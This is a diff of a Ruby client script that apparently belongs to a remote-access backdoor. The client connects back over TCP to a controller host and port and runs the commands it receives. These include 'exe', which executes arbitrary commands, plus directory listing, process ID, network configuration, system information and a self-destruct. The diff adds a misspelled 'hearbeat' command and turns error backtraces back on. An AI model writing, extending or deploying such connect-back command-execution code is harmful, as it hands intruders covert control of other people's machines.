@@ -1,8 +1,5 @@
 #!/usr/bin/env ruby
 
-# !!! Exception messages are commented out for performance
-# !!! Ensure to uncomment when debugging
-
 require_relative "helpers.rb"
 
 def handle_client(client)
@@ -12,11 +9,13 @@ def handle_client(client)
     next if data.nil?
     cmd, action = data.split ' '
     case cmd
+    when 'hearbeat'
+      result = 'alive'
     when 'exe'
       begin
         result = Helpers.exe(data.gsub('exe ', ''))
       rescue Exception => e
-        #puts e.backtrace
+        puts e.backtrace
       end
     when 'ls'
       result = Helpers.ls
@@ -26,8 +25,8 @@ def handle_client(client)
       result = Helpers.pid
     when 'ifconfig'
       result = Helpers.ifconfig
-    when 'sysinfo'
-      result = Helpers.sysinfo
+    when 'system'
+      result = Helpers.system
     when 'destroy'
       return 42
     end
@@ -43,7 +42,7 @@ def main(timeout)
   host = ARGV[0]
   port = ARGV[1]
 
-  # If host/port is not passed in ARGV, default to localhost:3000
+  # If host/port is not passed in ARGV, default to localhost:3200
   host ||= "localhost"
   port ||= 3200
 
@@ -53,7 +52,7 @@ def main(timeout)
     begin
       client = TCPSocket.new(host, port)
     rescue Exception => e
-      #puts e.backtrace
+      puts e.backtrace
       sleep(timeout)
     end
 
@@ -63,7 +62,7 @@ def main(timeout)
     rescue Interrupt
       exit 0
     rescue Exception => e
-      #puts e.backtrace
+      puts e.backtrace
     end
 
     if exit_code == 42
